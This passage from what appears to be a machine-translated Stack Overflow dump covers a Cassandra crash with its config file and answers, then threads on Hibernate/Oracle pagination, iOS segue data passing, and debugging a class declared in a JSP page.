    at org.apache.thrift.ProcessFunction.process(ProcessFunction.java:32)
    at org.apache.thrift.TBaseProcessor.process(TBaseProcessor.java:34)
    at org.apache.cassandra.thrift.CustomTThreadPoolServer$WorkerProcess.run(CustomTThreadPoolServer.java:186)
    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1110)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:603)
    at java.lang.Thread.run(Thread.java:722) 
```

**cassanda.yaml**

```
cluster_name: "Test Cluster"

initial_token:

hinted_handoff_enabled: true
max_hint_window_in_ms: 3600000 # one hour
hinted_handoff_throttle_delay_in_ms: 1

authenticator: org.apache.cassandra.auth.AllowAllAuthenticator

authority: org.apache.cassandra.auth.AllowAllAuthority

partitioner: org.apache.cassandra.dht.RandomPartitioner

data_file_directories:
    - /mnt
    - /ebs

commitlog_directory: /mnt/cassandra_log/

key_cache_size_in_mb:

key_cache_save_period: 14400

row_cache_size_in_mb: 0

row_cache_save_period: 0

row_cache_provider: SerializingCacheProvider

saved_caches_directory: /var/lib/cassandra/saved_caches

commitlog_sync: periodic
commitlog_sync_period_in_ms: 10000

seed_provider:
    # Addresses of hosts that are deemed contact points. 
    # Cassandra nodes use this list of hosts to find each other and learn
    # the topology of the ring.  You must change this if you are running
    # multiple nodes!
    - class_name: org.apache.cassandra.locator.SimpleSeedProvider
      parameters:
          # seeds is actually a comma-delimited list of addresses.
          # Ex: "<ip1>,<ip2>,<ip3>"
          - seeds: "127.0.0.1"

flush_largest_memtables_at: 0.45

reduce_cache_sizes_at: 0.45
reduce_cache_capacity_to: 0.45

concurrent_reads: 8
concurrent_writes: 8

memtable_total_space_in_mb: 64

commitlog_total_space_in_mb: 64

memtable_flush_writers: 1

memtable_flush_queue_size: 1

trickle_fsync: false
trickle_fsync_interval_in_kb: 10240

storage_port: 7776

ssl_storage_port: 7001

listen_address: 10.242.253.141

rpc_address: 0.0.0.0
rpc_port: 9160

rpc_keepalive: true

rpc_server_type: sync

thrift_framed_transport_size_in_mb: 15

thrift_max_message_length_in_mb: 16

incremental_backups: false

snapshot_before_compaction: false

auto_snapshot: true

column_index_size_in_kb: 64

in_memory_compaction_limit_in_mb: 64

multithreaded_compaction: false

compaction_throughput_mb_per_sec: 16

compaction_preheat_key_cache: true

rpc_timeout_in_ms: 10000

endpoint_snitch: SimpleSnitch

dynamic_snitch_update_interval_in_ms: 100 
dynamic_snitch_reset_interval_in_ms: 600000
dynamic_snitch_badness_threshold: 0.1

request_scheduler: org.apache.cassandra.scheduler.NoScheduler

index_interval: 128

encryption_options:
    internode_encryption: none
    keystore: conf/.keystore
    keystore_password: cassandra
    truststore: conf/.truststore
    truststore_password: cassandra
    # More advanced defaults below:
    # protocol: TLS
    # algorithm: SunX509
    # store_type: JKS
    # cipher_suites: [TLS_RSA_WITH_AES_128_CBC_SHA,TLS_RSA_WITH_AES_256_CBC_SHA] 
```

那么怎么了？请指导？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-01T22:30:08.623

看起来 Cassandra 进程正在被关闭，大概是因为收到了一个信号。这些行表明：

```
INFO [StorageServiceShutdownHook] 2012-07-31 12:44:26,679 CassandraDaemon.java (line 218) Stop listening to thrift clients
INFO [StorageServiceShutdownHook] 2012-07-31 12:44:26,762 MessagingService.java (line 539) Waiting for messaging service to quiesce
INFO [ACCEPT-/10.242.253.141] 2012-07-31 12:44:26,780 MessagingService.java (line 695) MessagingService shutting down server thread.
ERROR [Thrift:40765] 2012-07-31 12:44:26,858 CustomTThreadPoolServer.java (line 204) Error occurred during processing of message.
java.util.concurrent.RejectedExecutionException: ThreadPoolExecutor has shut down 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2014-01-23T04:10:06.600

我有同样的问题。我想出了两件事首先去

```
sudo vim /etc/cassandra/cassandra.yaml 
```

并将监听 ip 更改为私有 ip 是您在 AWS 上并将 rpc_ip 更改为 0.0.0.0

还要确保你的服务器至少有 2GB 内存，否则 cassandra 会一直崩溃！！

要在 ubuntu 上启动 cassandra，请尝试以下命令：

```
sudo service cassandra restart 
```

并检查状态

```
sudo service cassandra status 
```

希望这可以帮助

# oracle - Hibernate 和 Oracle Pagination/ScrollableResult 获得 400 万条结果

> ID：11751994
> 
> 赞同：0
> 
> 时间：2012-08-01T03:01:11.110
> 
> 标签：oracle, hibernate, pagination

我可以知道 oracle 和 hibernate 是否支持有效的分页/可滚动结果？

我记得过去许多数据库只是加载所有结果（400 万）并“滚动”数据。这是hibernate和oracle 11g的变化吗？

如果上述问题得到解决，任何使用 hibernate 和 oracle 实现正确分页的文档。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-01T05:35:36.523

使用 Hibernate 进行分页可以使用`Query.setFirstResult()`和来完成`Query.setMaxResults()`。这将触发一个如下所示的 SQL 查询（IIRC）：

```
select * from (select _this.a, _this.b from some_table _this) where rownum > ? and rownum < ? 
```

SQL 查询将只返回所需的数据页。

如果您想滚动查询结果而不是加载列表中的所有内容，请使用`Query.scroll()`.

# objective-c - 如何使用“didSelectRowAtIndexPath:(NSIndexPath *)indexPath”方法

> ID：11751996
> 
> 赞同：3
> 
> 时间：2012-08-01T03:01:12.227
> 
> 标签：objective-c, xcode4, uiviewcontroller, uitableview, appdelegate

我的问题：当用户在某个单元格中选择一个播放器时，我希望与该播放器相关的其余信息显示在新的视图控制器上

到目前为止，我的方法如下所示：

```
 - (void)tableView:(UITableView *)tableView didSelectRowAtIndexPath:(NSIndexPath   *)indexPath
{
IPlayerViewController *detailViewController = [[IPlayerViewController alloc] initWithNibName:@"IPlayerViewController.h" bundle:nil];
Player *playerF = [playerArray objectAtIndex:indexPath.row];
detailViewController.PlayerLabel.text=playerF.Name;

[self.navigationController pushViewController:detailViewController animated:YES];

} 
```

但是，我在 IPlayerViewController 中创建的 PlayerLabel（并将 UILabel 连接到情节提要中的标签）是空白的。

如果这看起来很熟悉，那是因为我正在遵循以下教程，但尝试添加我自己的东西。非常感谢！ [http://www.raywenderlich.com/5138/beginning-storyboards-in-ios-5-part-1](http://www.raywenderlich.com/5138/beginning-storyboards-in-ios-5-part-1)

编辑：我正在使用故事板。然而，在预定义的方法中，xcode 附带了以下注释以使用 Nib Name 进行初始化，这让我大吃一惊。

```
- (void)tableView:(UITableView *)tableView didSelectRowAtIndexPath:(NSIndexPath   *)indexPath
{
   // Navigation logic may go here. Create and push another view controller.
/*
 <#DetailViewController#> *detailViewController = [[<#DetailViewController#> alloc] initWithNibName:@"<#Nib name#>" bundle:nil];
 // ...
 // Pass the selected object to the new view controller.
 [self.navigationController pushViewController:detailViewController animated:YES];
 */

} 
```

所以看来我应该使用prepareForSegue。这是我在 didSelectRowAtIndexPath 中调用的，还是我忽略了该方法？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-01T20:17:59.363

如果您使用情节提要，那么很可能您不会看到对`-tableView:didSelectRowAtIndexPath:`. 如果您使用 segues 进入下一个视图，那么您将需要使用`-prepareForSegue:sender:`see: [How to pass prepareForSegue: an object](https://stackoverflow.com/questions/7864371/ios5-how-to-pass-prepareforsegue-an-object)。

* * *

**更新**

你有从表格视图单元到你的细节视图控制器的segue吗？

如果你有一个segue，那`-tableView:didSelectRowAtIndexPath:`不是你想要的。如果您有 segue，`-prepareForSegue:sender:`请在表视图控制器中创建一个方法。它看起来像：

```
- (void)prepareForSegue:(UIStoryboardSegue *)segue sender:(id)sender
{
    NSIndexPath *indexPath = [self.tableView indexPathForCell:sender];
    Player *player = [self.playerArray objectAtIndex:indexPath.row];

    IPlayerViewController *destination = segue.destinationViewController;
    destination.player = player;
} 
```

当然假设 IPlayerViewController 有一个 player 属性。

希望有帮助。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-01T20:20:07.470

在您的下一个视图 controller.h 中，您需要一个 player 属性。

```
@property (nonatomic,strong) Player *player; 
```

如果您使用故事板，则必须将 selectedRow 索引保存在您的类中，并实现 prepareForSegue 方法，例如：

```
- (void)prepareForSegue:(UIStoryboardSegue *)segue sender:(id)sender {

  NextViewController *controller = segue.destinationViewController
  controller.player = [self.players objectAtIndex: YOUR_SAVED_INDEX];
} 
```

明白这个概念吗？

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-01T20:20:13.920

由于您使用笔尖进行初始化，因此我假设您**没有**使用情节提要....

我认为您所做的一切都是正确的，除了不要尝试将名称直接放入标签中，因为它尚未加载。在您的详细控制器中创建一个属性，该属性只是一个用于保存名称的字符串。在代码中设置**它**`didSelectRowAtIndexPath:`，然后`viewDidLoad:`在细节控制器中更新标签。

# jsp - 调试在 jsp 页面中声明的类

> ID：11751998
> 
> 赞同：1
> 
> 时间：2012-08-01T03:01:19.683
> 
> 标签：jsp

在我的 jsp 项目中有一个包含 java 类的页面（在 jsp 页面内声明），现在我需要调试该类，因为应该将注释和异常写入页面，我尝试了 out.println("") ， out.write("") 但两者都不起作用......请帮忙

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-01T03:38:01.927

我有一个替代解决方案，1）在java类中声明一个List变量来保存注释和异常2）函数执行完成后，使用类的对象访问页面中的列表3）最后使用out将值打印到页面.println("")。